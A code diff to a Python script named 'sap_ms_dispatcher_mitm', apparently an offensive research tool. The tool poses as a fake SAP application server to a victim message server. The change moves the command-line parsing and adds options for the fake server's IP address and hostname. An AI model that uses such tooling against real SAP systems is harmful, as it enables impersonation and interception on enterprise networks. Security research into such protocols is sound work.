@@ -513,7 +513,33 @@ attacked_as = {"ip": "172.16.100.50",
                "release":"745",
                "patchno":"15"}
 
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
+    parser.add_argument('-H', '--host', default='sap-abap-01', help='AS victim IP/hostname (default: sap-abap-01)')
+    parser.add_argument('-P', '--port', default=3901, type=int, help='AS internal message server port (default: 3901)')
+    parser.add_argument('-d', '--debug', action='store_true', help='Show debug info')
+    parser.add_argument('-q', '--quiet', action='store_true', help='Don\'t show any info messages')
+    parser.add_argument('-i', '--fakeip', help='IP address of  the fake AS')
+    parser.add_argument('-n', '--fakename', help='Hostname of the fake AS')
+    
+    args = parser.parse_args()
 
+    prog = 'sap_ms_dispatcher_mitm'
+    if args.quiet:
+        logger = init_logger(prog, logging.NOTSET)
+    elif args.debug:
+        logger = init_logger(prog, logging.DEBUG)
+    else:
+        logger = init_logger(prog, logging.INFO)
+
+    # update our default conf with customized version:
+    attacked_as["host"] = args.host
+    attacked_as["msport"] = args.port
+    if args.fakeip:
+        fake_as["ip"] = args.fakeip
+    if args.fakename:
+        fake_as["host"] = args.fakename
+    
 my_name = gen_ms_servername(fake_as["host"], attacked_as["sid"], attacked_as["instance"])
 anon_name = '-' + ' '*39
 
@@ -669,26 +695,6 @@ p_get_hwid = SAPMS(fromname=my_name,
 
 if __name__ == '__main__':
     signal.signal(signal.SIGINT, sigint_handler)
-    parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
-    parser.add_argument('-H', '--host', default='sap-abap-01', help='AS victim IP/hostname (default: sap-abap-01)')
-    parser.add_argument('-P', '--port', default=3901, type=int, help='AS internal message server port (default: 3901)')
-    parser.add_argument('-d', '--debug', action='store_true', help='Show debug info')
-    parser.add_argument('-q', '--quiet', action='store_true', help='Don\'t show any info messages')
-    
-    args = parser.parse_args()
-
-    prog = 'sap_ms_dispatcher_mitm'
-    if args.quiet:
-        logger = init_logger(prog, logging.NOTSET)
-    elif args.debug:
-        logger = init_logger(prog, logging.DEBUG)
-    else:
-        logger = init_logger(prog, logging.INFO)
-
-    # update our default conf with customized version:
-    attacked_as["host"] = args.host
-    attacked_as["msport"] = args.port
-
     conf.L3Socket = StreamSocket
     # SAPMS layer
     bind_layers(TCP, SAPNI)
